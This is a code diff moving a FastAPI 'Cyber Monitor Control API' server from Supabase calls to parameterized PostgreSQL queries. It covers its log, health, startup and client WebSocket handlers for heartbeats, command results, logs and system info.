+        conn = get_db_connection()
+        if not conn:
+            # Return mock data for development
+            mock_logs = [
+                {
+                    "id": "log-001",
+                    "client_id": "dev-001",
+                    "log_type": "info",
+                    "message": "System started successfully",
+                    "created_at": datetime.utcnow().isoformat()
+                }
+            ]
+            return {"success": True, "logs": mock_logs}
+        
+        cursor = conn.cursor()
+        
+        query = """
+            SELECT l.id, cl.client_id, cl.name as client_name, 
+                   l.log_type, l.message, l.created_at
+            FROM logs l
+            JOIN clients cl ON l.client_id = cl.id
+            WHERE 1=1
+        """
+        
+        params = []
+        if client_id:
+            query += " AND cl.client_id = %s"
+            params.append(client_id)
+        
+        if log_type and log_type != "all":
+            query += " AND l.log_type = %s"
+            params.append(log_type)
+        
+        query += " ORDER BY l.created_at DESC LIMIT %s"
+        params.append(limit)
+        
+        cursor.execute(query, params)
+        logs = cursor.fetchall()
+        
+        # Format the response
+        formatted_logs = []
+        for log in logs:
+            formatted_log = dict(log)
+            formatted_log["clients"] = {
+                "client_id": log["client_id"],
+                "name": log["client_name"]
+            }
+            # Convert datetime objects
+            if formatted_log["created_at"]:
+                formatted_log["created_at"] = formatted_log["created_at"].isoformat()
+            del formatted_log["client_name"]
+            formatted_logs.append(formatted_log)
+        
+        return {"success": True, "logs": formatted_logs}
+    except Exception as e:
+        print(f"❌ Get logs error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/api/test-auth", response_model=dict)
+async def test_auth(_: dict = Depends(authenticate_user)):
+    """Test authentication endpoint"""
+    return {
+        "success": True,
+        "message": "Authentication successful",
+        "timestamp": datetime.utcnow().isoformat()
+    }
 
 # ========== WEBSOCKET ENDPOINTS ==========
 @app.websocket("/ws/admin")
@@ -909,40 +1094,37 @@ async def websocket_client(websocket: WebSocket, client_id: str):
     """WebSocket endpoint for client connections"""
     await manager.connect_client(websocket, client_id)
     try:
-        # Update client status
-        if supabase:
-            try:
-                supabase.table("clients").update({
-                    "online": True,
-                    "last_seen": datetime.utcnow().isoformat()
-                }).eq("client_id", client_id).execute()
-            except Exception as e:
-                print(f"⚠️ Client status update error: {e}")
-        
         while True:
             data = await websocket.receive_json()
             data_type = data.get("type")
             
             if data_type == "heartbeat":
                 # Update last seen
-                if supabase:
+                conn = get_db_connection()
+                if conn:
                     try:
-                        supabase.table("clients").update({
-                            "last_seen": datetime.utcnow().isoformat(),
-                            "online": True
-                        }).eq("client_id", client_id).execute()
+                        cursor = conn.cursor()
+                        cursor.execute("""
+                            UPDATE clients 
+                            SET last_seen = NOW(), online = true
+                            WHERE client_id = %s
+                        """, (client_id,))
+                        conn.commit()
                     except:
                         pass
                 
             elif data_type == "command_result":
                 # Update command status
-                if supabase:
+                conn = get_db_connection()
+                if conn:
                     try:
-                        supabase.table("commands").update({
-                            "status": "completed",
-                            "result": data.get("result"),
-                            "completed_at": datetime.utcnow().isoformat()
-                        }).eq("id", data.get("command_id")).execute()
+                        cursor = conn.cursor()
+                        cursor.execute("""
+                            UPDATE commands 
+                            SET status = 'completed', result = %s, completed_at = NOW()
+                            WHERE id = %s
+                        """, (data.get("result"), data.get("command_id")))
+                        conn.commit()
                     except:
                         pass
                 
@@ -957,21 +1139,20 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                 
             elif data_type == "log":
                 # Store log
-                if supabase:
+                conn = get_db_connection()
+                if conn:
                     try:
-                        client_res = supabase.table("clients") \
-                            .select("id") \
-                            .eq("client_id", client_id) \
-                            .execute()
-                        if client_res.data:
-                            supabase.table("logs").insert({
-                                "client_id": client_res.data[0]["id"],
-                                "log_type": data.get("log_type", "info"),
-                                "message": data.get("message", ""),
-                                "created_at": datetime.utcnow().isoformat()
-                            }).execute()
-                    except:
-                        pass
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
+                        client_result = cursor.fetchone()
+                        if client_result:
+                            cursor.execute("""
+                                INSERT INTO logs (client_id, log_type, message)
+                                VALUES (%s, %s, %s)
+                            """, (client_result['id'], data.get("log_type", "info"), data.get("message", "")))
+                            conn.commit()
+                    except Exception as e:
+                        print(f"⚠️ Log storage error: {e}")
                 
                 # Notify admins
                 await manager.notify_admins({
@@ -984,18 +1165,18 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                 
             elif data_type == "system_info":
                 # Store system info
-                if supabase:
+                conn = get_db_connection()
+                if conn:
                     try:
-                        client_res = supabase.table("clients") \
-                            .select("id") \
-                            .eq("client_id", client_id) \
-                            .execute()
-                        if client_res.data:
-                            supabase.table("system_info").insert({
-                                "client_id": client_res.data[0]["id"],
-                                "info": data.get("info", {}),
-                                "created_at": datetime.utcnow().isoformat()
-                            }).execute()
+                        cursor = conn.cursor()
+                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
+                        client_result = cursor.fetchone()
+                        if client_result:
+                            cursor.execute("""
+                                INSERT INTO system_info (client_id, info)
+                                VALUES (%s, %s::jsonb)
+                            """, (client_result['id'], json.dumps(data.get("info", {}))))
+                            conn.commit()
                     except:
                         pass
                 
@@ -1008,45 +1189,32 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                 })
                 
     except WebSocketDisconnect:
-        # Mark client as offline
-        if supabase:
-            try:
-                supabase.table("clients").update({
-                    "online": False
-                }).eq("client_id", client_id).execute()
-            except:
-                pass
         manager.disconnect(websocket)
     except Exception as e:
         print(f"❌ Client WebSocket error: {str(e)}")
-        # Mark client as offline
-        if supabase:
-            try:
-                supabase.table("clients").update({
-                    "online": False
-                }).eq("client_id", client_id).execute()
-            except:
-                pass
         manager.disconnect(websocket)
 
 # ========== HEALTH AND INFO ==========
 @app.get("/api/health", response_model=dict)
 async def health_check():
     """Health check endpoint"""
+    conn = get_db_connection()
+    
     health_status = {
-        "status": "healthy" if supabase else "unhealthy",
+        "status": "healthy" if conn else "unhealthy",
         "timestamp": datetime.utcnow().isoformat(),
         "version": "3.0",
-        "database": "connected" if supabase else "disconnected",
+        "database": "connected" if conn else "disconnected",
         "active_clients": len(manager.client_connections),
         "active_admins": len(manager.admin_connections),
-        "environment": os.getenv("RENDER", "development")
+        "environment": "production"
     }
     
     # Test database connection
-    if supabase:
+    if conn:
         try:
-            supabase.table("users").select("count", count="exact").limit(1).execute()
+            cursor = conn.cursor()
+            cursor.execute("SELECT 1")
             health_status["database"] = "connected"
         except Exception as e:
             health_status["database"] = f"error: {str(e)}"
@@ -1057,11 +1225,13 @@ async def health_check():
 @app.get("/", response_model=dict)
 async def root():
     """Root endpoint with API info"""
+    conn = get_db_connection()
+    
     return {
         "message": "🚀 Cyber Monitor Control API",
         "version": "3.0",
         "status": "running",
-        "database": "connected" if supabase else "disconnected",
+        "database": "connected" if conn else "disconnected",
         "timestamp": datetime.utcnow().isoformat(),
         "endpoints": {
             "login": "POST /api/login",
@@ -1080,15 +1250,32 @@ async def root():
         }
     }
 
-# This allows the app to be run directly or imported
-if __name__ == "__main__":
-    print(f"🚀 Starting Cyber Monitor Control API")
+# ========== APPLICATION STARTUP ==========
+@app.on_event("startup")
+async def startup_event():
+    """Initialize database on startup"""
+    print(f"🚀 Starting Cyber Monitor Control API v3.0")
     print(f"📡 Port: {PORT}")
-    print(f"🔗 Supabase: {'Connected' if supabase else 'Disconnected'}")
-    print(f"👥 Active connections: 0")
-    print(f"📚 Documentation: http://localhost:{PORT}/docs")
-    print(f"🌐 WebSocket endpoints:")
+    
+    # Test database connection
+    conn = get_db_connection()
+    if conn:
+        try:
+            cursor = conn.cursor()
+            cursor.execute("SELECT COUNT(*) as count FROM users")
+            result = cursor.fetchone()
+            print(f"✅ Database connected - Users: {result['count']}")
+        except Exception as e:
+            print(f"❌ Database test failed: {e}")
+    else:
+        print("⚠️  Database connection failed - Running in development mode")
+    
+    print(f"🔗 WebSocket endpoints:")
     print(f"   • Admin: ws://localhost:{PORT}/ws/admin")
     print(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
+    print(f"📚 Documentation: http://localhost:{PORT}/docs")
 
-
+# This allows the app to be run directly or imported
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=PORT)
